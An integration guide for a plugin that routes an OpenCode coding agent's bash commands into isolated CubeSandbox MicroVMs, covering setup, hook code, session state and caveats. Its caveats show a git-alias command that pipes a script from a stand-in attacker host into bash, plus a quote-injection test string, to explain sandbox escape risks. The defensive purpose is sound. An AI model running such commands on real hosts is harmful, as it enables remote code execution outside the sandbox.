---
title: OpenCode Integration Guide (Plugin Hook)
author: Tantanovo
date: 2026-07-31
tags:
  - integration
  - opencode
  - coding-agent
  - plugin
lang: en-US
---

# OpenCode Integration Guide (Plugin Hook)

Run OpenCode on your host, but execute every `bash` command it issues inside an
isolated CubeSandbox MicroVM. The redirection happens in a plugin hook, so the
model needs no prompt, tool, or workflow change.

## Integration Target and Version

| Item | Version tested |
|---|---|
| OpenCode | plugin API with `tool.execute.before` (see [OpenCode plugins](https://opencode.ai/docs/plugins/)) |
| CubeSandbox | v0.6.0 (`8721dd15`, built 2026-07-24) |
| Python SDK | `e2b-code-interpreter` |
| Host | Ubuntu 24.04.4 LTS on WSL2, kernel 6.18.33.2, glibc 2.39 |

Runnable example: [`examples/opencode-plugin-sandbox`](https://github.com/TencentCloud/CubeSandbox/tree/master/examples/opencode-plugin-sandbox)

## Why a plugin hook

OpenCode runs on the developer host, so every `bash` command it issues executes
there with the developer's privileges.

MCP- and SDK-based sandbox integrations only help when the model *chooses* to
call a sandbox tool. A plain `bash` call still lands on the host, and the
failure is silent — you learn about it afterwards.

OpenCode's `tool.execute.before` hook can rewrite tool arguments before
execution. That gives a place to intercept `bash` unconditionally:

```
OpenCode (host)
  ├── read / write / edit ──────────────────► host project files
  │
  └── bash ──► tool.execute.before ──► exec_backend.py ──► CubeAPI ──► MicroVM
               (cubesandbox-bash.js)                       (:3000)
```

Only `bash` is redirected. `read`, `write`, and `edit` keep operating on host
files, so the agent still edits the real project while its shell commands run in
a throwaway kernel, filesystem, and network namespace.

The alternative design — running OpenCode itself inside a sandbox — costs the
agent access to the working tree, git credentials, and editor state. Redirecting
only `bash` keeps the agent where the code is and moves just the dangerous part.

## Prerequisites

- Cube Sandbox deployment: single-node one-click install is enough
  ([Quick Start](./../quickstart.md))
- SDK or CLI dependencies: `pip install e2b-code-interpreter`; OpenCode installed
- Required environment variables: `CUBE_TEMPLATE_ID`, `E2B_API_URL`,
  `E2B_API_KEY`, `SSL_CERT_FILE`

## Integration Steps

### 1. Build a template

The platform probes the container over HTTP to decide when a template is ready,
so `--expose-port` and `--probe` are mandatory
([Creating Templates from OCI Images](./../tutorials/template-from-image.md)).

```bash
cubemastercli tpl create-from-image \
  --image cube-sandbox-cn.tencentcloudcr.com/cube-sandbox/sandbox-code:latest \
  --writable-layer-size 1G \
  --expose-port 49999 \
  --expose-port 49983 \
  --probe 49999
```

Wait for `READY`, then note the `template_id`:

```bash
cubemastercli tpl list
```

Outside mainland China use `cube-sandbox-int.tencentcloudcr.com`.

### 2. Install the SDK

```bash
pip install e2b-code-interpreter
```

On Ubuntu 24.04, PEP 668 blocks installing into the system interpreter. Use a
virtualenv and tell the plugin about it:

```bash
python3 -m venv ~/.venvs/cube
~/.venvs/cube/bin/pip install e2b-code-interpreter
export CUBE_OPENCODE_PYTHON=~/.venvs/cube/bin/python
```

### 3. Export configuration

```bash
export CUBE_TEMPLATE_ID=tpl-xxxxxxxx
export E2B_API_URL=http://127.0.0.1:3000
export E2B_API_KEY=e2b_000000
export SSL_CERT_FILE=/root/.local/share/mkcert/rootCA.pem
```

Export these **before** starting OpenCode; variables exported afterwards are not
visible to the editor's child processes.

### 4. Install the plugin

OpenCode loads every `.js` / `.ts` file in a plugin directory at startup, so
installing means placing one file:

```bash
cd examples/opencode-plugin-sandbox
./plugin/install.sh            # project scope: ./.opencode/plugin/
./plugin/install.sh --global   # every project: ~/.config/opencode/plugin/
./plugin/install.sh --status   # show where it is installed
./plugin/install.sh --uninstall
```

Restart OpenCode afterwards — plugins load at startup only.

### 5. Verify isolation

Ask OpenCode:

> Run `uname -r` and tell me the kernel version.

Compare with `uname -r` in your own terminal. **The values must differ.** That
difference is the proof: a container sharing your kernel would report the same
version.

Measured on the environment in the table above:

```
sandbox : 6.6.1199-0009-03_2.0.1
host    : 6.18.33.2-microsoft-standard-WSL2
```

Two further checks:

> Run `ls /` and describe what you see.

The listing is the sandbox rootfs.

> Create `/tmp/only-in-sandbox` and confirm it exists.

It exists for the model; `ls /tmp/only-in-sandbox` on the host reports
"No such file or directory".

## Key Code Snippets

### The hook

The whole redirection is one hook. `output.args.command` is mutable, so
assigning to it changes what actually runs:

```js
export const CubeSandboxBashPlugin = async ({ client }) => ({
  "tool.execute.before": async (input, output) => {
    if (input.tool !== "bash") return;

    // Fail closed: without the backend, block rather than run on the host.
    if (!fs.existsSync(BACKEND)) {
      throw new Error("[cubesandbox-bash] backend not found; refusing to run on host");
    }

    // The original command becomes one argv element, so shell metacharacters
    // in it can never be interpreted by the host shell.
    output.args.command = [
      shellQuote(pythonInterpreter()),
      shellQuote(BACKEND),
      "--session", shellQuote(resolveSessionId(input)),
      "--command", shellQuote(output.args.command),
    ].join(" ");
  },
});
```

Three properties are worth calling out:

**Fail closed.** If the command cannot be redirected safely, the hook throws and
OpenCode blocks the call. A sandbox integration that silently falls back to the
host is worse than none, because the failure is invisible.

**Injection safe.** `shellQuote` wraps the command in single quotes and escapes
embedded quotes using the POSIX idiom. Given
`echo A'; touch /tmp/pwned; echo '`, the host shell parses the rewritten string
into exactly six argv elements, the last being the original text verbatim. The
`touch` never executes.

**Idempotent.** Multiple plugins can observe the same call, so the hook returns
early if the command already references the backend.

### Preserving session state

A shell is only useful if consecutive commands share state. The backend wraps
each command so the guest reports its final cwd and environment, which the host
stores per session and restores on the next call:

```python
lines = [
    "set +e",
    f"cd {shlex.quote(cwd)} 2>/dev/null || cd {shlex.quote(DEFAULT_WORKDIR)}",
    *(f"export {k}={shlex.quote(str(v))}" for k, v in env.items()),
    f"bash -c {shlex.quote(command)}",
    "__cube_rc=$?",
    f'echo "{_STATE_BEGIN}"',
    "python3 -c 'import json,os;print(json.dumps({\"cwd\": os.getcwd(), ...}))'",
    f'echo "{_STATE_END}"',
    'echo "__CUBE_RC__=$__cube_rc"',
]
```

Result:

```
> cd /workspace/demo && pwd     →  /workspace/demo
> pwd                           →  /workspace/demo   (preserved)
> export TOKEN=abc123
> echo $TOKEN                   →  abc123            (preserved)
```

State lives in `~/.cache/cubesandbox-opencode/<session>.json`, mode `0600`
because it can hold values exported by commands. The session id is sanitised
before use in a filename so it cannot escape the state directory.

### Concurrency

OpenCode may issue several `bash` calls at once. Calls within one session are
serialised with an `O_CREAT | O_EXCL` lock file, with stale-lock reclamation so
a crashed call cannot wedge the session. Different sessions run in parallel.

## Caveats

**A MicroVM per call, not per session.** Session *state* is preserved, but the
VM is recreated each time (~1 s on the reference environment). Keeping one alive
between calls needs a resident helper or CubeSandbox pause/resume.

**`read` / `write` / `edit` are not sandboxed.** Intentional — the agent must be
able to edit the project — but a malicious `write` is not covered by this
integration.

**Passthrough is empty by default, and it is an escape hatch rather than a
narrow exception.** Matching is on the leading token only, so allowing `git`
allows every `git`-prefixed command — and git can be made to run arbitrary
shell:

```bash
git -c alias.x='!curl http://attacker/sh | bash' x
```

That runs on the host, unsandboxed and unlogged. Since the model's commands are
the untrusted input this integration exists to contain, `git` is not on the
default list. Anything added to the list must be treated as fully trusted with
host privileges.

The trade-off is real, and it is why the list exists: the sandbox has its own
filesystem, so `git commit` executed there operates on a different repository
than the one OpenCode edits. Developers who accept the risk can opt in:

```bash
export CUBE_OPENCODE_PASSTHROUGH=git,gh
```

**Hook payload shape is not a stable contract.** The session id key has been
spelled differently across OpenCode versions, so several variants are probed
with a fallback. If every known key is missing, all sessions collapse onto one
shared state file and lock, so cwd and exported environment bleed between
concurrent sessions. Commands still run in a MicroVM, so this is not a host
escape, but it is more than a loss of reuse granularity.

**A command that calls `exec` loses its state update.** `exec` replaces the
shell's process image, which discards the trap that emits the state block. The
backend keeps the previous session state in that case, so cwd and environment
are stale rather than wrong. `exit` is handled correctly; only `exec` is
affected.

**Interactive commands do not work.** Output is captured, so anything expecting
a TTY (`vim`, `top`) will not behave normally.

**Wildcard DNS is required.** The SDK reaches sandboxes at
`<port>-<sandboxId>.cube.app`. The one-click install ships CoreDNS for this, but
some environments overwrite `/etc/resolv.conf`. WSL rewrites it on every boot
unless `/etc/wsl.conf` contains:

```ini
[network]
generateResolvConf = false
```

See [HTTPS & Domain Resolution](./../https-and-domain.md).

**Network policy is not configured here.** Restrict sandbox egress with
[Network Policy](./../network-policy.md) if the agent should not reach arbitrary
hosts.

## Tests

```bash
cd examples/opencode-plugin-sandbox
node tests/test_plugin.mjs
```

24 assertions covering rewriting, passthrough, idempotence, session-id handling,
and quote-injection resistance. Node standard library only — no npm install, no
network, no CubeSandbox deployment required.

The injection assertions parse the rewritten command the way a POSIX shell
would and check the original text lands in exactly one argv element. That is a
stronger property than substring matching: broken quoting would split the
payload across elements and fail the assertion.

## References

- Related docs: [Quick Start](./../quickstart.md),
  [Creating Templates from OCI Images](./../tutorials/template-from-image.md),
  [HTTPS & Domain Resolution](./../https-and-domain.md),
  [Network Policy](./../network-policy.md)
- Sample repository: [`examples/opencode-plugin-sandbox`](https://github.com/TencentCloud/CubeSandbox/tree/master/examples/opencode-plugin-sandbox)
- Upstream project: [OpenCode](https://opencode.ai/) ·
  [Plugin documentation](https://opencode.ai/docs/plugins/)
